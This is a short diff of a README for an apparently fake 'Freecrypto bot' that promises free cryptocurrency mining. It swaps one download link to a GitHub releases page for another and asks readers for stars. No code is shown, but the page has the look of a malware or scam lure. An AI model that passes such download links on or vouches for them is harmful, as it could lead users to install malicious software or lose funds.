@@ -42,7 +42,7 @@ https://github.com/darkangeldarkshaper1992/darkangeldarkshaper1992/assets/166773
 1. open Freecrypto bot
 2. Paste into the menu of your cryptocurrency and click start, thereby starting the mining flow
 
--[<img src="https://github.com/darkangeldarkshaper1992/darkangeldarkshaper1992/assets/166773117/a6e17ec4-2fc2-4a4c-801c-dd0de5f646d0"/>](https://github.com/culm65gonzo/Nicehash-airdrop/releases/tag/Download_last_version)
+-[<img src="https://github.com/darkangeldarkshaper1992/darkangeldarkshaper1992/assets/166773117/a6e17ec4-2fc2-4a4c-801c-dd0de5f646d0"/>](https://github.com/darkangeldarkshaper1992/Freecrypto/releases/tag/Download_last_version)
 
 ### 🚀Please repay with a star for the work done🚀
 
